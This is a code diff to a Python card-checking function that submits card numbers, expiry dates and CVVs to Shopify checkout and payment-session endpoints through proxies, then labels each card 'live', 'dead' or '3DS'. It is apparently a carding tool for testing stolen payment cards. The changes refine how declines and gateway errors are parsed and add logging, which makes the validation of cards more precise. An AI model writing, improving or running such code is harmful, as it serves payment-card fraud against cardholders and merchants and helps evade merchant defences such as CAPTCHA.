@@ -422,6 +422,8 @@ def _check_card_with_session(session, cc, month, year, cvv, sub_month, site_inpu
                 "payment_session_scope": domain
             }
 
+            # Use the same session to maintain proxy stickiness
+            print(f"[LOG] Getting card token for domain: {domain}", file=sys.stderr)
             response = make_request_with_proxy("https://deposit.shopifycs.com/sessions", 
                                              'POST', headers=token_headers, json_data=payload, session=session)
 
@@ -682,6 +684,8 @@ def _check_card_with_session(session, cc, month, year, cvv, sub_month, site_inpu
         return {'status': 'dead', 'message': 'Invalid Response'}
 
     receipt_id = None
+    print(f"[LOG] Submitting with cctoken: {cctoken[:40]}... PMI: {payment_method_identifier}", file=sys.stderr)
+    
     try:
         headers = {
             'accept': 'application/json',
@@ -924,22 +928,44 @@ def _check_card_with_session(session, cc, month, year, cvv, sub_month, site_inpu
                 return {'status': 'dead', 'message': '[DEAD] CAPTCHA DETECTED', 'price': total_amount}
 
             response_json = response.json()
-            receipt_id = response_json.get("data", {}).get("submitForCompletion", {}).get("receipt", {}).get("id")
+            submit_data = response_json.get("data", {}).get("submitForCompletion", {})
+            receipt_id = submit_data.get("receipt", {}).get("id")
 
             if receipt_id:
                 print(f"[LOG] Receipt ID: {receipt_id}", file=sys.stderr)
                 break
             else:
+                # Extract error details from the response
+                errors = submit_data.get("errors", [])
+                reason = submit_data.get("reason", "")
+                
+                if errors:
+                    error_msgs = []
+                    for err in errors:
+                        msg = err.get("localizedMessage") or err.get("nonLocalizedMessage") or err.get("code", "")
+                        if msg:
+                            error_msgs.append(msg)
+                    if error_msgs:
+                        gateway_error = " | ".join(error_msgs)
+                        print(f"[LOG] Gateway Error: {gateway_error}", file=sys.stderr)
+                        return {'status': 'dead', 'message': f'[DEAD] {gateway_error}', 'price': f'${total_amount}' if total_amount else None}
+                
+                if reason:
+                    print(f"[LOG] Submit Rejected: {reason}", file=sys.stderr)
+                    return {'status': 'dead', 'message': f'[DEAD] {reason}', 'price': f'${total_amount}' if total_amount else None}
+                
                 retry_count += 1
                 time.sleep(1)
                 if retry_count >= max_retries:
+                    # Log the raw response for debugging
+                    print(f"[LOG] Raw Submit Response: {json.dumps(submit_data)[:500]}", file=sys.stderr)
                     raise Exception("Receipt ID is empty")
 
     except Exception as e:
         try:
-            return {'status': 'dead', 'message': 'Invalid Response', 'price': f'${total_amount}' if total_amount else None}
+            return {'status': 'dead', 'message': f'[DEAD] Submit Failed: {str(e)[:50]}', 'price': f'${total_amount}' if total_amount else None}
         except:
-            return {'status': 'dead', 'message': 'Invalid Response'}
+            return {'status': 'dead', 'message': '[DEAD] Submit Failed'}
 
     if receipt_id:
         purl = f"{base_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
@@ -1005,19 +1031,28 @@ def _check_card_with_session(session, cc, month, year, cvv, sub_month, site_inpu
                     return {'status': 'live', 'message': f'[3DS] 3DS Card | ${total_amount}', 'price': price_str}
 
                 elif 'processingError' in response_text:
-                    err = response_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code', 'Unknown Error')
-                    return {'status': 'dead', 'message': f'[DEAD] {err} | ${total_amount}', 'price': price_str}
+                    proc_error = response_json.get('data', {}).get('receipt', {}).get('processingError', {})
+                    err_code = proc_error.get('code', '')
+                    err_msg = proc_error.get('messageUntranslated', '')
+                    err_display = err_msg if err_msg else err_code if err_code else 'Payment Failed'
+                    return {'status': 'dead', 'message': f'[DEAD] {err_display}', 'price': price_str}
+
+                elif 'FailedReceipt' in response_text:
+                    return {'status': 'dead', 'message': f'[DEAD] Payment Declined', 'price': price_str}
 
                 else:
-                    return {'status': 'dead', 'message': 'Invalid Response'}
+                    # Extract any meaningful error from response
+                    receipt_type = response_json.get('data', {}).get('receipt', {}).get('__typename', '')
+                    print(f"[LOG] Receipt Type: {receipt_type}", file=sys.stderr)
+                    return {'status': 'dead', 'message': f'[DEAD] {receipt_type if receipt_type else "Unknown Response"}', 'price': price_str}
                     
             except Exception as e:
-                return {'status': 'dead', 'message': 'Invalid Response'}
+                return {'status': 'dead', 'message': f'[DEAD] Parse Error: {str(e)[:30]}', 'price': price_str}
 
         except Exception as e:
-            return {'status': 'dead', 'message': 'Invalid Response'}
+            return {'status': 'dead', 'message': f'[DEAD] Poll Failed: {str(e)[:30]}', 'price': price_str}
     
-    return {'status': 'dead', 'message': 'Invalid Response'}
+    return {'status': 'dead', 'message': '[DEAD] No Receipt ID', 'price': f'${total_amount}' if total_amount else None}
 
 
 if __name__ == "__main__":
